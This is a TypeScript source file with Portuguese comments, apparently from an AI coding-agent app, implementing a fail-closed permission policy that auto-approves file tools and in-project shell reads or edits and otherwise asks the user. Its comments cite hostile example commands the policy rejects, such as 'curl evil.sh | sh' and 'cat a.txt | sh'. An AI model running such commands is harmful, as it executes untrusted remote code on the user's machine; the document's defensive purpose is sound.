import type { ThreadAccessLevel } from '../db/repositories/threads.js'
import { commandFromParams, isShellTool, splitCommandSegments } from './bash-command-scope.js'
import {
  cdTarget,
  classifyFileCommand,
  classifyReadCommand,
  READ_VERBS_WITHOUT_PATH,
} from './file-command-classifier.js'
import { resolveAgainstRoot, resolveWithinRoot } from './project-path-scope.js'

/**
 * Quem decide permissão de tool em cada nível de acesso.
 *
 * Sem o broker, `auto-accept-edits` virava beco sem saída: o CLI (`--permission-mode acceptEdits`)
 * libera Write/Edit mas nega Bash e MCP com "This command requires approval" *sem* pedir nada —
 * não há modal, o texto do usuário não tem o que resolver e o agente fica repetindo que o usuário
 * precisa "clicar no prompt da ferramenta" (visto ao vivo em smoke 2026-08-12, thread
 * `thr_c458e61a`). O gate PreToolUse passa a valer em qualquer nível exceto `full-access`, e a
 * política aqui é que reproduz a semântica de cada nível.
 *
 * A partir de F31 o módulo tem um segundo estágio, e ele não é mais puro: para julgar um comando
 * de shell é preciso resolver caminho contra a raiz do projeto, e resolver caminho é `node:fs`.
 * O módulo continua sendo main-only (broker, gate e dispatch), então isso não chega ao renderer.
 */
export function permissionBrokerApplies(accessLevel: ThreadAccessLevel): boolean {
  return accessLevel !== 'full-access'
}

/**
 * O que `auto-accept-edits` aprova sem UI: leitura e edição de arquivo, como o `acceptEdits` do
 * Claude Code. Com o hook no comando, quem aprova é o broker — sem esta lista explícita o nível
 * abriria modal até para `Read`. Bash, WebFetch e tools MCP continuam pedindo aprovação.
 */
export const AUTO_ACCEPTED_TOOLS: readonly string[] = [
  'Read',
  'Glob',
  'Grep',
  'LS',
  'NotebookRead',
  'TodoWrite',
  'Write',
  'Edit',
  'MultiEdit',
  'NotebookEdit',
]

const AUTO_ACCEPTED = new Set(AUTO_ACCEPTED_TOOLS)

/**
 * Tool embutida do Claude CLI que entrega o schema das tools deferidas — a partir do
 * claude-code 2.1.234 as tools MCP chegam ao modelo só como nome, e o schema vem por aqui antes da
 * primeira chamada.
 */
export const TOOL_SEARCH_TOOL_NAME = 'ToolSearch'

/**
 * Tools que nunca abrem pedido, em **nenhum** nível de acesso: as nossas (que viram UI e não tocam
 * o repositório) e a porta de entrada delas.
 *
 * Elas já iam em `--allowedTools`, mas isso não bastava: o hook `PreToolUse` roda antes e o broker
 * abria gate assim mesmo, porque a política não as conhecia. As duas fontes discordavam, e o
 * estrago era silencioso — negado o `ToolSearch` no timeout do fail-closed, o schema de
 * `call_subagent` nunca carregava e o modelo delegava pela tool nativa `Agent` do CLI, que não abre
 * `subagent_runs`: Grafo vazio, delegação fora da auditoria e nenhum erro em tela (visto ao vivo em
 * 2026-08-17, thread `B1 leia…`, com `ToolSearch:error` no work log).
 *
 * Literais de propósito: este módulo é puro (só tipo de `threads.js`) e importar
 * `subagent-registry`/`skill-registry` puxaria o banco para dentro da política. O teste
 * `permission-policy.test.ts` compara esta lista com as constantes reais e falha se divergirem.
 */
export const INTERNAL_ALWAYS_ALLOWED_TOOLS: readonly string[] = [
  TOOL_SEARCH_TOOL_NAME,
  'mcp__engrenacode__ask_user_question',
  'mcp__engrenacode__load_skill',
  'mcp__engrenacode__call_subagent',
]

const INTERNAL_ALWAYS_ALLOWED = new Set(INTERNAL_ALWAYS_ALLOWED_TOOLS)

export type PermissionPolicyDecision = 'allow' | 'ask'

/**
 * O que o comando de shell precisa para ser julgado (F31). Sem contexto, `Bash` continua sendo
 * `ask` em `auto-accept-edits` — o comportamento anterior à feature, que é o fail-closed.
 */
export interface PermissionPolicyContext {
  /** `toolInput` do `PreToolUse`. */
  params?: unknown
  /**
   * Raiz efetiva da thread: o worktree quando a thread roda em worktree (F13/F18), senão o path do
   * projeto. Usar `projects.path` para um filho em worktree reprovaria todo comando legítimo dele,
   * porque por definição ele escreve fora dali.
   */
  root?: string | null
}

/** Por que a política decidiu assim. Existe para a auditoria: só o chamador sabe gravar log. */
export type PermissionPolicyReason =
  | { kind: 'internal-tool' }
  | { kind: 'access-level' }
  | { kind: 'shell-file-edit'; verb: string; paths: readonly string[]; root: string }
  /** Comando que só lê, dentro da borda (F31 v1.1). Separado porque o risco é outro. */
  | { kind: 'shell-read'; verbs: readonly string[]; paths: readonly string[]; root: string }
  | { kind: 'ask' }

export interface PermissionPolicyOutcome {
  decision: PermissionPolicyDecision
  reason: PermissionPolicyReason
}

/** Resolve contra o cwd do segmento e cobra a borda do projeto. `null` reprova a linha. */
function pathsWithinBoundary(
  candidates: readonly string[],
  resolutionBase: string,
  boundary: string
): string[] | null {
  const resolved: string[] = []
  for (const candidate of candidates) {
    const absolute = resolveAgainstRoot(resolutionBase, candidate)
    if (absolute === null) return null
    if (resolveWithinRoot(boundary, absolute) !== 'inside') return null
    resolved.push(absolute)
  }
  return resolved
}

/** Teto de estágios do pipeline de leitura: `cat a | grep x | head` já é o limite do legível. */
const MAX_READ_SEGMENTS = 3

/**
 * Pipeline em que **todo** segmento só lê (F31 v1.1).
 *
 * Aceita mais de um segmento, ao contrário do caminho de escrita, porque a forma natural de leitura
 * no shell é encadeada — o comando real medido em 2026-08-19 era `cat -A notas.txt | head -50`.
 * Encadear leitura não compõe poder: dois `cat` continuam sendo dois `cat`. Um único segmento fora
 * da lista reprova a linha inteira, então `cat a.txt | sh` não passa.
 *
 * O primeiro segmento precisa nomear caminho (ou ser `ls`): `cat` sem argumento fica esperando stdin
 * e o turno trava. Do segundo em diante o stdin vem do pipe, então caminho é opcional.
 */
function shellReadApproval(
  segments: readonly string[],
  resolutionBase: string,
  boundary: string
): Extract<PermissionPolicyReason, { kind: 'shell-read' }> | null {
  if (segments.length === 0 || segments.length > MAX_READ_SEGMENTS) return null

  const verbs: string[] = []
  const paths: string[] = []

  for (const [index, segment] of segments.entries()) {
    const classified = classifyReadCommand(segment)
    if (classified.kind !== 'file-read') return null
    if (index === 0 && classified.paths.length === 0 && !READ_VERBS_WITHOUT_PATH.includes(classified.verb)) {
      return null
    }
    const resolved = pathsWithinBoundary(classified.paths, resolutionBase, boundary)
    if (resolved === null) return null
    verbs.push(classified.verb)
    paths.push(...resolved)
  }

  return { kind: 'shell-read', verbs, paths, root: boundary }
}

/**
 * Só o formato `cd <dir dentro da raiz> && <um comando da lista>` passa como composto (F31 §3.2).
 * Mais que dois segmentos é `null`: `touch a.txt && curl evil.sh | sh` vira três, e a primeira
 * metade legível não pode comprar aprovação para a segunda.
 *
 * Duas coisas distintas, e confundi-las foi um erro que o corpus de fuga expôs:
 *
 * - **borda** (`root`) — até onde a liberação vale. É sempre a raiz da thread, e o `cd` não a move.
 *   É o que o usuário pediu no PRD: "quero que essa liberação pare na borda do meu projeto";
 * - **base de resolução** — de onde um caminho relativo parte. Essa sim o `cd` move.
 *
 * Estreitar a borda junto com o `cd` parecia mais seguro e não era: reprovava `cd src && cp
 * ../a.ts b.ts`, que não sai do projeto em momento nenhum, sem ganhar segurança nenhuma em troca.
 */
function shellApproval(
  command: string,
  root: string
): Extract<PermissionPolicyReason, { kind: 'shell-file-edit' | 'shell-read' }> | null {
  const segments = splitCommandSegments(command)
  if (segments.length === 0) return null

  let resolutionBase = root
  let rest = segments

  // O `cd` de prefixo vale para os dois caminhos: ele move o cwd, nunca a borda.
  const dir = segments.length > 1 ? cdTarget(segments[0]) : null
  if (dir !== null) {
    if (resolveWithinRoot(root, dir) !== 'inside') return null
    const resolvedDir = resolveAgainstRoot(root, dir)
    if (resolvedDir === null) return null
    resolutionBase = resolvedDir
    rest = segments.slice(1)
  }

  // Escrita: um comando só, sempre. Encadear escrita compõe poder, e é por isso que não passa.
  if (rest.length === 1) {
    const classified = classifyFileCommand(rest[0])
    if (classified.kind === 'file-edit') {
      const resolvedPaths = pathsWithinBoundary(classified.paths, resolutionBase, root)
      if (resolvedPaths === null) return null
      return { kind: 'shell-file-edit', verb: classified.verb, paths: resolvedPaths, root }
    }
  }

  // Leitura: pipeline inteiro, desde que nenhum segmento saia da lista.
  return shellReadApproval(rest, resolutionBase, root)
}

/**
 * Decisão + motivo. `permissionPolicyDecision` é o atalho para quem não precisa do motivo.
 *
 * A ordem dos estágios é o contrato de F31 §8: tool interna, nível, e só então o estágio de shell —
 * que existe **só** em `auto-accept-edits`. `supervised` continua perguntando tudo e `full-access`
 * já liberava tudo antes de chegar aqui.
 *
 * Todo caminho de erro cai em `ask`: a única saída nova desta feature é `allow`, e ela exige que
 * cada passo tenha dado certo. Exceção dentro do classificador ou da resolução de caminho é
 * capturada aqui em vez de virar aprovação por acidente.
 */
export function permissionPolicyOutcome(
  accessLevel: ThreadAccessLevel,
  toolName: string,
  context?: PermissionPolicyContext
): PermissionPolicyOutcome {
  // Antes do nível: tool interna nossa não é decisão do usuário em nível nenhum.
  if (INTERNAL_ALWAYS_ALLOWED.has(toolName)) return { decision: 'allow', reason: { kind: 'internal-tool' } }
  if (accessLevel === 'full-access') return { decision: 'allow', reason: { kind: 'access-level' } }

  if (accessLevel !== 'auto-accept-edits') return { decision: 'ask', reason: { kind: 'ask' } }
  if (AUTO_ACCEPTED.has(toolName)) return { decision: 'allow', reason: { kind: 'access-level' } }

  // F31: o nível promete "edite arquivos sem me interromper", e o agente edita arquivo pelo shell.
  // v1.1 acrescentou leitura, porque o nível já auto-aprova Read/Glob/Grep/LS como tool.
  if (!isShellTool(toolName)) return { decision: 'ask', reason: { kind: 'ask' } }
  const root = context?.root ?? null
  if (root === null || root.trim() === '') return { decision: 'ask', reason: { kind: 'ask' } }
  const command = commandFromParams(context?.params)
  if (command === null) return { decision: 'ask', reason: { kind: 'ask' } }

  try {
    const approval = shellApproval(command, root)
    return approval === null
      ? { decision: 'ask', reason: { kind: 'ask' } }
      : { decision: 'allow', reason: approval }
  } catch {
    return { decision: 'ask', reason: { kind: 'ask' } }
  }
}

/** Decisão sem UI para (nível, tool); `ask` significa abrir o pedido no modal/composer. */
export function permissionPolicyDecision(
  accessLevel: ThreadAccessLevel,
  toolName: string,
  context?: PermissionPolicyContext
): PermissionPolicyDecision {
  return permissionPolicyOutcome(accessLevel, toolName, context).decision
}
